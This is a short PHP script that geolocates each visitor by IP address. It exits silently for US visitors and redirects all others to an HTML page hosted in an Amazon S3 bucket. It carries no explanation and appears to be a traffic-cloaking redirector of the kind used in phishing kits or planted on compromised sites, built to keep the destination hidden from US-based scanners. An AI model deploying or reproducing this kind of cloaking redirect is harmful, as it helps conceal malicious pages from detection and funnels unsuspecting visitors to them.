<?php






{
$randval = rand();





include("geoip.inc");                                                                                                     
$ip=$_SERVER['REMOTE_ADDR'];
$gi = geoip_open("GeoIP.dat",GEOIP_STANDARD);

$country_code = geoip_country_code_by_addr($gi, "$ip");

// Country name is not used so commented
// Get Country Name based on source IP
//$country = geoip_country_name_by_addr($gi, "$ip");

geoip_close($gi);

switch($country_code)                                

    {

          case "US": exit(); break;


              default: header("Location: https://s3.amazonaws.com/redi51/red.html");
}


}






?>
